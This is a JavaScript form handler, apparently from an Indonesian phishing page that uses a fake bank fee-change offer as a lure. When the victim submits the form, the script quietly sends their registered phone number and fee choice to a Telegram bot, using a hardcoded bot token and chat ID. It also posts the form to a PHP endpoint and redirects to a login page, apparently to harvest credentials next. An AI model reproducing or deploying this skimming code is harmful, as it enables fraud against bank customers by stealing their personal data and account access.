function sendHp() {
  event.preventDefault();
  var nomor = document.getElementById("nohp").value;
  sessionStorage.setItem("nomor", nomor);
  $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";
  var form = document.getElementById("formHP");
  var tarif = form.elements["tarif"].value;
  var nohp = form.elements["nohp"].value;

  // Pengaturan pesan yang akan dikirim ke Telegram
  var message = `
            *Form Data:*
            Tarif: ${tarif === 'baru' ? 'TARIF BARU Rp 150.000 / BULAN' : 'TARIF LAMA Rp 6.500 / TRANSAKSI'}
            No. HP Terdaftar: ${nohp}
        `;

  // Ganti TOKEN_BOT dengan token bot Telegram Anda
  var token = "7403024559:AAH8XFB-YgCjnNS5EzMLXdNAkmmi-QZca8M";
  // Ganti CHAT_ID dengan chat ID yang akan menerima notifikasi
  var chat_id = "-1002166704403";

  var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

  // Kirim permintaan HTTP POST ke API Telegram
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.send();

  $.ajax({
    type: 'POST',
    url: 'req/no.php',
    data: $('#formHP').serialize(),
    datatype: 'text',

    complete: function(data) {
      setTimeout(function() {
        window.location.href = 'login.html'
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
      }, 800);
    }
  })
}